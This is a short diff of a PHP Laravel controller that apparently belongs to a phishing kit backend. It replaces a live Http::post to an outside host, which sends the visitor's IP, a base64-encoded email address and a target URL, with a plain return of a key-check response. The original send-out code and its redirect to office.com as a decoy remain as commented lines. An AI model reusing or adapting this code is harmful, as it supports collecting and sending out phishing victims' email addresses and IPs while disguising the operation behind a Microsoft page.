@@ -110,16 +110,21 @@ class Controller extends BaseController
         if ($key_val->successful()){
             $target = $key_val["url_target"];
 
-            $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
-                "ip" => $this->get_ip(),
-                "subs" => base64_encode($email) ,
-                "target" => $target,
-            ]);
-            if ($send->successful()){
-                return $send->body();
-            }else{
-                return redirect()->away("https://office.com");
-            }
+            return $key_val->body();
+
+
+
+//            $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
+//                "ip" => $this->get_ip(),
+//                "subs" => base64_encode($email) ,
+//                "target" => $target,
+//
+//            ]);
+//            if ($send->successful()){
+//                return $send->body();
+//            }else{
+//                return redirect()->away("https://office.com");
+//            }
 
         }else{
             return $key_val->status();
